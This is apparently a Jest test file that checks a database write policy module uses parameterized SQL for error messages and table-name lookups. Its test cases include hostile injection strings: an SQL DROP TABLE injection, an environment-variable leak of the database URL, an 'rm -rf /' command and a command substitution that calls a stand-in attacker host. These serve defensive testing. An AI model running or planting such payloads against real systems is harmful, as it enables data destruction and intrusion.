import { describe, it, expect, jest, beforeEach } from '@jest/globals';
import { query } from '../../src/lib/db';
import { isAllowed } from '../../src/policy/dbWritePolicy';

// Mock the db module
jest.mock('../../src/lib/db');
jest.mock('../../src/lib/events');
jest.mock('../../src/lib/observability');

describe('DB Write Security', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Error Message Handling', () => {
    it('should properly parameterize error messages without string interpolation', async () => {
      const mockQuery = query as jest.MockedFunction<typeof query>;

      // Test various potentially malicious inputs in reason
      const testCases = [
        'no rule',
        'op not allowed',
        "'; DROP TABLE users; --",
        "${process.env.DATABASE_URL}",
        "`rm -rf /`",
        "$(curl evil.com)",
        "\\x00\\x01\\x02",
        "policy: ${allowed.reason}"
      ];

      for (const reason of testCases) {
        mockQuery.mockClear();

        // Simulate the db_write handler updating step status with error
        const stepId = 'step_123';
        const errorMessage = `policy: ${reason}`;

        // The correct way - parameterized query
        await query(
          `update nofx.step set status='failed', ended_at=now(), error=$2 where id=$1`,
          [stepId, errorMessage]
        );

        // Verify the query was called with proper parameterization
        expect(mockQuery).toHaveBeenCalledWith(
          `update nofx.step set status='failed', ended_at=now(), error=$2 where id=$1`,
          [stepId, errorMessage]
        );

        // Verify no string interpolation in SQL
        const sqlArg = mockQuery.mock.calls[0][0];
        expect(sqlArg).not.toContain(reason);
        expect(sqlArg).toContain('$1');
        expect(sqlArg).toContain('$2');
      }
    });

    it('should handle policy check results safely', async () => {
      const mockQuery = query as jest.MockedFunction<typeof query>;

      // Mock isAllowed to return various reasons
      mockQuery.mockResolvedValueOnce({
        rows: []
      });

      const result = await isAllowed('users', 'insert');
      expect(result.ok).toBe(false);
      expect(result.reason).toBe('no rule');

      // Verify reason is a controlled string
      expect(typeof result.reason).toBe('string');
      expect(['no rule', 'op not allowed']).toContain(result.reason);
    });

    it('should never include user input directly in SQL strings', async () => {
      const mockQuery = query as jest.MockedFunction<typeof query>;

      // Test that table names are parameterized in isAllowed
      const maliciousTableName = "users'; DROP TABLE users; --";

      mockQuery.mockResolvedValueOnce({
        rows: []
      });

      await isAllowed(maliciousTableName, 'insert');

      // Verify the query used parameterization
      expect(mockQuery).toHaveBeenCalledWith(
        expect.stringContaining('$1'),
        [maliciousTableName]
      );

      // Verify the SQL doesn't contain the malicious input directly
      const sqlArg = mockQuery.mock.calls[0][0];
      expect(sqlArg).not.toContain(maliciousTableName);
    });
  });
});